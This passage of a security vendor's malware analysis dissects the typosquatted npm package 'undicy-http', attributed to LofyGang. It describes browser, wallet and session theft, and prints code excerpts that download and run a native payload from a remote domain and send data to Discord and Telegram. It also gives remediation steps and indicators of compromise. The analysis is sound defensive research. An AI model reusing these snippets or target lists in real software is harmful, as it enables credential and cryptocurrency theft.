+<h3 id="browser-data-50-browsers"><a href="#browser-data-50-browsers" aria-hidden="true" tabindex="-1">Browser Data (50+ Browsers)</a></h3>
+<p>The malware targets an extensive list of Chromium-based browsers (Chrome, Chrome Beta/Dev/Canary, Edge, Edge Beta/Dev/Canary, Brave, Opera, Opera GX, Vivaldi, Yandex, Arc, Sidekick, Slimjet, SRWare Iron, Comodo Dragon, Epic Privacy, Coc Coc, Cent, 7Star, Amigo, Torch, Sogou, UC Browser, QIP Surf, RockMelt, Flock, Bowser), Gecko-based browsers (Firefox, Firefox ESR, Pale Moon, Waterfox, Cyberfox, SeaMonkey, IceDragon, K-Meleon, Basilisk, Tor Browser), and Safari on Windows.</p>
+<h3 id="cryptocurrency-wallet-theft"><a href="#cryptocurrency-wallet-theft" aria-hidden="true" tabindex="-1">Cryptocurrency Wallet Theft</a></h3>
+<p><strong>90+ browser wallet extensions</strong> are targeted, including:</p>
+<p>MetaMask, Phantom, Coinbase Wallet, Binance Wallet, Trust Wallet, Exodus, Atomic, OKX, Rabby, XDEFI, SafePal, Keplr, Terra Station, Nami, Eternl, Yoroi, TronLink, Ronin, Solflare, Slope, Braavos, Polymesh, Nabox, KardiaChain, Wombat, MEW CX, Guarda, EVER Wallet, Clover, Leather (Hiro), Sui Wallet, Petra Aptos, Martian Aptos, Pontem Aptos, Sender, Goby, Leap Cosmos, Core, Harmony, Enkrypt, Opera Wallet, Rainbow, Zerion, Talisman, Backpack, Fordefi, SubWallet, PolkadotJS, Compass, OWallet, Cosmostation, Frontier, Bifrost, Frame, Temple, Beacon, Kukai, Spire, Umami, Cyano, OneKey, Coin98, TokenPocket, ioPay, Auro, Leafkey, Nifty, BoltX, Saturn, Guild, Taho, Xverse, DeFi Wallet, Avail, Casper Signer, Finnie, Stargazer, Maiar DeFi, Flint Wallet, Brave Wallet, and more.</p>
+<p><strong>28+ desktop wallets</strong> are targeted:</p>
+<p>Exodus, Atomic, Electrum, Ethereum, Monero, Bytecoin, Jaxx Liberty, Zcash, Armory, Coinomi, Guarda, Wasabi, Bitcoin Core, Litecoin Core, Dash Core, Dogecoin Core, Daedalus, Yoroi, Nami, Eternl, MultiBit, Binance.</p>
+<p><strong>6 hardware/cold wallet</strong> integrations: Ledger Live, Trezor Suite, KeepKey, BitBox.</p>
+<p>The malware also recursively scans user directories for <code>wallet.dat</code> files and seed phrase backup files matching patterns like <code>/wallet.*backup/i</code>.</p>
+<p>For Exodus specifically, it attempts to crack the wallet password using PBKDF2:</p>
+<pre><code class="language-javascript">const var_747 = crypto.pbkdf2Sync(arg_217, "exodus", 1e4, 32, "sha512");
+</code></pre>
+<h3 id="session-hijacking"><a href="#session-hijacking" aria-hidden="true" tabindex="-1">Session Hijacking</a></h3>
+<ul>
+<li><strong>Roblox</strong>: <code>.ROBLOSECURITY</code> cookie, username, display name, user ID, Robux balance, profile URL  </li>
+<li><strong>Instagram</strong>: Session cookie, username, full name, follower/following counts, profile picture, bio, email, phone, account type (business/personal), verification status  </li>
+<li><strong>Spotify</strong>: <code>sp_dc</code> cookie, username, email, subscription plan, country, account creation date, profile URL  </li>
+<li><strong>TikTok</strong>: <code>sessionid</code> cookie, username, user ID, email, follower/following/like counts, coin balance, profile URL  </li>
+<li><strong>Steam</strong>: Full <code>config</code> directory (zipped), Steam ID, username, level, game count, profile creation date. Uses hardcoded Steam API key <code>440D7F4D810EF9298D25EDDF37C1F902</code>  </li>
+<li><strong>Telegram</strong>: <code>tdata</code> directory (zipped), containing local session data  </li>
+<li><strong>Discord</strong>: Backup codes scanned from Desktop, Documents, Downloads, Videos, Pictures, Music directories</li>
+</ul>
+<h3 id="system-profiling"><a href="#system-profiling" aria-hidden="true" tabindex="-1">System Profiling</a></h3>
+<p>Before exfiltration, the malware collects:</p>
+<ul>
+<li>Public IP (via <code>ipinfo[.]io</code> and <code>myexternalip[.]com</code>)  </li>
+<li>Geolocation (country, city, region, ISP)  </li>
+<li>Hostname, OS version, CPU model, core count, RAM  </li>
+<li>System uptime  </li>
+<li>Installed antivirus (scans for Avast, McAfee, Norton, Kaspersky, BitDefender, ESET, AVG, Malwarebytes, Sophos)</li>
+</ul>
+<h2 id="native-binary-payload"><a href="#native-binary-payload" aria-hidden="true" tabindex="-1"><strong>Native Binary Payload</strong></a></h2>
+<p>The Node.js layer downloads and executes a native PE binary from <code>hxxp[://]amoboobs[.]com/arquivos/chromelevator.exe</code>:</p>
+<pre><code class="language-javascript">const var_519 = CONFIG.exeUrl; // "hxxp[:]//amoboobs[.]com/arquivos/chromelevator.exe"
+let var_521 = fn_51(); // Try Defender exclusion paths first
+if (!var_521) {
+    var_521 = path.join(os.tmpdir(), "WinSvcHost");
+}
+const response = await axios.get(var_519, { responseType: "arraybuffer" });
+fs.writeFileSync(path.join(var_521, "chromelevator.exe"), Buffer.from(response.data));
+spawn(exePath, [], { stdio: "ignore", detached: true, windowsHide: true }).unref();
+</code></pre>
+<p>The download function (<code>fn_52</code>) first queries Windows Defender exclusion paths via PowerShell and drops the binary there if possible. If not, it falls back to <code>%TEMP%\WinSvcHost</code>. Execution has three fallback strategies: direct spawn, <code>cmd.exe /c start /b</code>, and a VBScript <code>ShellExecute "runas"</code> (UAC bypass attempt).</p>
+<h3 id="virustotal-findings"><a href="#virustotal-findings" aria-hidden="true" tabindex="-1">VirusTotal Findings:</a></h3>
+<p>The full VirusTotal analysis is available <a href="https://www.virustotal.com/gui/file/d6090c843c58f183fb5ed3ab3f67c9d96186d1b30dfd9927b438ff6ffedee196" target="_blank" rel="nofollow noopener noreferrer">here</a>. The payload is served from <code>172[.]67[.]173[.]92</code> behind Cloudflare.</p>
+<p><img src="/img/RealTimePostImage/post/lofygang-returns/VT_screen.png"></p>
+<h2 id="exfiltration"><a href="#exfiltration" aria-hidden="true" tabindex="-1">Exfiltration</a></h2>
+<p>The malware uses dual exfiltration channels that operate in parallel:</p>
+<p><strong>Discord Webhook:</strong></p>
+<pre><code class="language-javascript">CONFIG.webhook = "https://ptb.discord.com/api/webhooks/1484725829412851915/54vteo...";
+axios.post(CONFIG.webhook, payload, { headers: { "Content-Type": "application/json" } });
+</code></pre>
+<p><strong>Telegram Bot API</strong> (base64-encoded URL construction):</p>
+<pre><code class="language-javascript">CONFIG.telegram.token = "8713069597:AAEcZWknr3IsA7QFvh-FqeYdjw5WaKKf-Uk";
+CONFIG.telegram.chatId = "8245283894";
+// Decoded: "https://api.telegram.org" + "/bot" + token + "/sendMessage"
+const telegramUrl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn") + "/"
+    + atob("Ym90") + token + "/" + atob("c2VuZE1lc3NhZ2U=") + "?chat_id=" + chatId;
+</code></pre>
+<p>Large files (wallet data, Telegram <code>tdata</code>, Steam config) are first uploaded to <strong>gofile.io</strong> (with multiple server fallback) or <strong>catbox.moe</strong>, and the download link is sent via the webhook/Telegram.</p>
+<h2 id="infection-vector-assessment"><a href="#infection-vector-assessment" aria-hidden="true" tabindex="-1">Infection Vector Assessment</a></h2>
+<p><strong>Classification: Typosquatting</strong></p>
+<p>The package name <code>undicy-http</code> is a deliberate misspelling of <code>undici</code>, the official HTTP client library maintained by the Node.js project. The <code>undici</code> package averages millions of weekly downloads, making its namespace a high-value typosquatting target. The package contains no legitimate HTTP client code whatsoever.</p>
+<p><strong>Threat actor attribution: LofyGang</strong></p>
+<p>Multiple indicators link this package to the LofyGang group:</p>
+<ul>
+<li>Author field: <code>"ConsoleLofy"</code> (contains <code>Lofy</code> keyword)  </li>
+<li>Hardcoded strings: <code>"=== Lofygang Started ==="</code>, <code>"Lofygang | t.me/lofygang"</code>, webhook usernames set to <code>"Lofygang"</code>  </li>
+<li>Portuguese-language log messages throughout the code (<code>"Conectado ao servidor"</code>, <code>"monitor(es) detectado(s)"</code>, <code>"Tarefa agendada removida"</code>)  </li>
+<li>Discord injection technique consistent with previously documented LofyGang payloads  </li>
+<li>Folder name <code>"lofygang-local"</code> used for staging stolen data</li>
+</ul>
+<h2 id="remediation"><a href="#remediation" aria-hidden="true" tabindex="-1"><strong>Remediation</strong></a></h2>
+<ol>
+<li><strong>Uninstall the package</strong> immediately: <code>npm uninstall undicy-http</code>  </li>
+<li><strong>Kill running processes</strong>: Look for <code>node</code> or <code>wscript.exe</code> processes with command lines containing <code>client.js --bg</code>, <code>_nyx_launch.vbs</code>, or <code>svchost.vbs</code>  </li>
+<li>
+<p><strong>Remove persistence artifacts</strong>:  </p>
+<ul>
+<li>Delete scheduled task: <code>schtasks /Delete /TN "ScreenLiveClient" /F</code>  </li>
+<li>Remove registry key: <code>reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ScreenLiveClient" /f</code>  </li>
+<li>Delete <code>%TEMP%\_nyx_launch.vbs</code> and <code>%TEMP%\svchost.vbs</code> (unhide first: <code>attrib -h -s</code>)  </li>
+<li>Check Startup folder for copies of the executable  </li>
+</ul>
+</li>
+<li><strong>Remove dropped payloads</strong>: Delete <code>chromelevator.exe</code> from Windows Defender exclusion paths and <code>%TEMP%\WinSvcHost\</code>  </li>
+<li><strong>Remove staging directory</strong>: Delete <code>%LOCALAPPDATA%\lofygang-local\</code>  </li>
+<li><strong>Restore Discord</strong>: Reinstall all Discord variants to remove injected <code>discord_desktop_core/index.js</code>  </li>
+<li>
+<p><strong>Rotate all credentials</strong>:  </p>
+<ul>
+<li>All browser-saved passwords  </li>
+<li>Discord tokens (change password, enable 2FA, regenerate backup codes)  </li>
+<li>Roblox, Instagram, Spotify, TikTok, Steam, Telegram sessions  </li>
+</ul>
+</li>
+<li><strong>Move cryptocurrency assets</strong> immediately if any targeted wallets were installed. Generate new seed phrases on a clean machine.  </li>
+<li><strong>Revoke all browser sessions</strong> across all browsers  </li>
+<li><strong>Block C2 addresses</strong>: <code>24[.]152[.]36[.]243</code>, <code>amoboobs[.]com</code>  </li>
+<li><strong>Re-image the machine</strong> if <code>chromelevator.exe</code> was executed, as the native payload operates at a level where full system trust cannot be restored through manual cleanup</li>
+</ol>
+<h2 id="conclusions"><a href="#conclusions" aria-hidden="true" tabindex="-1"><strong>Conclusions</strong></a></h2>
+<p>This package represents a significant evolution in LofyGang's capabilities. Previous campaigns (documented in 2022) used JavaScript-only payloads for Discord token theft and credit card interception via client injection. <code>undicy-http@2.0.0</code> introduces a <strong>compiled native binary</strong> with syscall-level process injection, a <strong>full-featured WebSocket RAT</strong> with multimedia capture, and an <strong>extensive session hijacking module</strong> covering six major platforms, none of which were present in earlier LofyGang tooling.</p>
+<p>The scope of data targeted is exceptional: <strong>50+ browser families</strong>, <strong>90+ wallet extensions</strong>, <strong>28+ desktop wallets</strong>, <strong>6 hardware wallet integrations</strong>, and session data from <strong>6 non-browser platforms</strong> (Roblox, Instagram, Spotify, TikTok, Steam, Telegram). The Exodus wallet module even attempts offline password cracking via PBKDF2. Combined with live screen/webcam/microphone streaming and remote shell access, this package provides a near-total compromise of a victim's sensitive data.</p>
+<p>The attacker invested considerable effort in evasion: 10-point anti-VM detection, fake DLL error dialogs, anti-debugging traps, VBScript hidden execution, Defender exclusion path abuse for payload delivery, and direct syscalls in the native binary to bypass EDR hooks. Detection should focus on: outbound WebSocket connections from npm package contexts, <code>schtasks</code> or <code>reg add</code> execution during package installation, and file writes to <code>discord_desktop_core/index.js</code> from non-Discord processes.</p>
+<p>This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.</p>
+<h2 id="indicators-of-compromise"><a href="#indicators-of-compromise" aria-hidden="true" tabindex="-1">Indicators of Compromise</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">Indicator</th>
+<th align="left">Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><strong>Package</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Package Name</td>
+<td align="left"><code>undicy-http</code></td>
+</tr>
+<tr>
+<td align="left">Package Type</td>
+<td align="left">npm</td>
+</tr>
+<tr>
+<td align="left">Version</td>
+<td align="left">2.0.0</td>
+</tr>
+<tr>
+<td align="left">Author</td>
+<td align="left">ConsoleLofy</td>
+</tr>
+<tr>
+<td align="left">XRAY-ID</td>
+<td align="left">XRAY-958718</td>
+</tr>
+<tr>
+<td align="left"><strong>C2 Infrastructure</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">WebSocket C2</td>
+<td align="left"><code>ws[://]24[.]152[.]36[.]243:3000</code></td>
+</tr>
+<tr>
+<td align="left">C2 Hosting</td>
+<td align="left">Master da Web Datacenter LTDA (Brazil), AS270564</td>
+</tr>
+<tr>
+<td align="left">Payload Domain</td>
+<td align="left"><code>hxxp[://]amoboobs[.]com/arquivos/chromelevator.exe</code></td>
+</tr>
+<tr>
+<td align="left">Payload Serving IP</td>
+<td align="left"><code>172[.]67[.]173[.]92</code> (Cloudflare)</td>
+</tr>
+<tr>
+<td align="left">Payload DNS</td>
+<td align="left"><code>188[.]114[.]97[.]7</code>, <code>188[.]114[.]96[.]7</code> (Cloudflare)</td>
+</tr>
+<tr>
+<td align="left"><strong>Exfiltration</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Discord Webhook</td>
+<td align="left"><code>hxxps[://]ptb[.]discord[.]com/api/webhooks/148………………/54v…</code></td>
+</tr>
+<tr>
+<td align="left">Telegram Bot Token</td>
+<td align="left"><code>8713069597:AAEcZW…………</code></td>
+</tr>
+<tr>
+<td align="left">Telegram Chat ID</td>
+<td align="left"><code>8245283894</code></td>
+</tr>
+<tr>
+<td align="left">Steam API Key</td>
+<td align="left"><code>440D7F4D810EF929……………</code></td>
+</tr>
+<tr>
+<td align="left">File Upload</td>
+<td align="left"><code>gofile[.]io</code>, <code>catbox[.]moe</code></td>
+</tr>
+<tr>
+<td align="left">IP Lookup</td>
+<td align="left"><code>ipinfo[.]io/json</code>, <code>myexternalip[.]com/raw</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Native Binary</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Filename</td>
+<td align="left"><code>chromelevator.exe</code></td>
+</tr>
+<tr>
+<td align="left">SHA256</td>
+<td align="left"><code>d6090c843c58f183fb5ed3ab3f67c9d96186d1b30dfd9927b438ff6ffedee196</code></td>
+</tr>
+<tr>
+<td align="left">File Size</td>
+<td align="left">1,458,176 bytes</td>
+</tr>
+<tr>
+<td align="left">Type</td>
+<td align="left">PE32+ executable (GUI) x86-64, Windows</td>
+</tr>
+<tr>
+<td align="left">Linked DLLs</td>
+<td align="left"><code>KERNEL32.dll</code>, <code>ADVAPI32.dll</code>, <code>WINHTTP.dll</code>, <code>VERSION.dll</code></td>
+</tr>
+<tr>
+<td align="left">VT First Seen</td>
+<td align="left">2026-03-21</td>
+</tr>
+<tr>
+<td align="left">Server Last-Modified</td>
+<td align="left">2026-03-21 13:45:20 UTC</td>
+</tr>
+<tr>
+<td align="left"><strong>Persistence</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Scheduled Task</td>
+<td align="left"><code>ScreenLiveClient</code> (ONLOGON, HIGHEST)</td>
+</tr>
+<tr>
+<td align="left">Registry Key</td>
+<td align="left"><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScreenLiveClient</code></td>
+</tr>
+<tr>
+<td align="left">Dropped VBS</td>
+<td align="left"><code>%TEMP%\_nyx_launch.vbs</code>, <code>%TEMP%\svchost.vbs</code></td>
+</tr>
+<tr>
+<td align="left">Staging Directory</td>
+<td align="left"><code>%LOCALAPPDATA%\lofygang-local\</code></td>
+</tr>
+<tr>
+<td align="left">Payload Drop Path</td>
+<td align="left"><code>%TEMP%\WinSvcHost\chromelevator.exe</code> (or Defender exclusion path)</td>
+</tr>
+<tr>
+<td align="left"><strong>Attribution</strong></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Threat Group</td>
+<td align="left">LofyGang</td>
+</tr>
+<tr>
+<td align="left">Telegram Channel</td>
+<td align="left"><code>t[.]me/lofygang</code></td>
+</tr>
+<tr>
+<td align="left">Origin</td>
+<td align="left">Brazil (Portuguese-language strings, LACNIC IP space)</td>
+</tr>
+</tbody>
+</table>
+</section><!----></div></div></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script src="/assets/js/app.4e943a10.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
